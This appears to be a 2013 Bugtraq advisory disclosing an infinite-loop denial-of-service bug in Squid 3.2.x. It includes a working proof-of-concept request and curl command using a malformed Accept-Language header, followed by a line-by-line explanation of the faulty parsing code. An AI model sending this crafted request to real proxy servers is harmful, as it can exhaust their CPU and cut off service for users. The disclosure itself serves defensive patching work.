@@ -1,0 +1,97 @@
+
+Date: Tue, 05 Mar 2013 20:53:30 +0000
+From: tytusromekiatomek@...hmail.com
+To: bugtraq@...urityfocus.com
+Subject: Squid 3.2.7 DoS (loop, 100% cpu) strHdrAcptLangGetItem() at errorpage.cc
+
+################################################################
+# DoS (loop, 100% cpu) strHdrAcptLangGetItem() at errorpage.cc #
+################################################################
+#
+# Authors:
+#
+# 22733db72ab3ed94b5f8a1ffcde850251fe6f466
+# c8e74ebd8392fda4788179f9a02bb49337638e7b
+# AKAT-1
+#
+#######################################
+
+# Versions: 3.2.5, 3.2.7 
+
+
+  This error is only triggered when squid needs to generate an error page (for example backend node is not responding etc...)
+  POC (request):
+  -- cut --
+  GET http://127.0.0.1:1/foo HTTP/1.1
+  Accept-Language: ,
+  -- cut --
+
+  e.g : curl -H "Accept-Language: ," http://localhost:3129/
+
+  Code:
+
+    strHdrAcptLangGetItem is called with pos equals 0, therefore first branch
+    in if (316 line) is taken, because xisspace(hdr[pos]) is false, then pos++
+    is not executed (because hdr[0] is ','). In 335 line statement in while is
+    also false because hdr[0] = ',', so whole loop body is omited. dt = lang,
+    thus after assignment in 353 line *lang == '\0', so expression in if
+    statement in 357 line is false. So next execution of while body (314 line),
+    has got same preconditions as previous, thus it's infinite loop.
+
+   312  bool strHdrAcptLangGetItem(const String &hdr, char *lang, int langLen, size_t &pos)
+   313  {
+   314      while (pos < hdr.size()) {
+   315          char *dt = lang;
+
+   316          if (!pos) {
+   317              /* skip any initial whitespace. */
+   318              while (pos < hdr.size() && xisspace(hdr[pos]))
+   319                  ++pos;
+   320          } else {
+   321              // IFF we terminated the tag on whitespace or ';' we need to skip to the next ',' or end of header.
+   322              while (pos < hdr.size() && hdr[pos] != ',')
+   323                  ++pos;
+   324              if (hdr[pos] == ',')
+   325                  ++pos;
+   326          }
+
+   327          /*
+   328           * Header value format:
+   329           *  - sequence of whitespace delimited tags
+   330           *  - each tag may suffix with ';'.* which we can ignore.
+   331           *  - IFF a tag contains only two characters we can wildcard ANY translations matching: <it> '-'? .*
+   332           *    with preference given to an exact match.
+   333           */
+   334          bool invalid_byte = false;
+   335          while (pos < hdr.size() && hdr[pos] != ';' && hdr[pos] != ',' && !xisspace(hdr[pos]) && dt < (lang + (langLen -1)) ) {
+   336              if (!invalid_byte) {
+   337  #if USE_HTTP_VIOLATIONS
+   338                  // if accepting violations we may as well accept some broken browsers
+   339                  //  which may send us the right code, wrong ISO formatting.
+   340                  if (hdr[pos] == '_')
+   341                      *dt = '-';
+   342                  else
+   343  #endif
+   344                      *dt = xtolower(hdr[pos]);
+   345                  // valid codes only contain A-Z, hyphen (-) and *
+   346                  if (*dt != '-' && *dt != '*' && (*dt < 'a' || *dt > 'z') )
+   347                      invalid_byte = true;
+   348                  else
+   349                      ++dt; // move to next destination byte.
+   350              }
+   351              ++pos;
+   352          }
+   353          *dt = '\0'; // nul-terminated the filename content string before system use.
+   354          ++dt;
+
+   355          debugs(4, 9, HERE << "STATE: dt='" << dt << "', lang='" << lang << "', pos=" << pos << ", buf='" << ((pos < hdr.size()) ? hdr.substr(pos,hdr.size()) : "") << "'");
+
+   356          /* if we found anything we might use, try it. */
+   357          if (*lang != '\0' && !invalid_byte)
+   358              return true;
+   359      }
+   360      return false;
+   361  }
+
+EOF
+
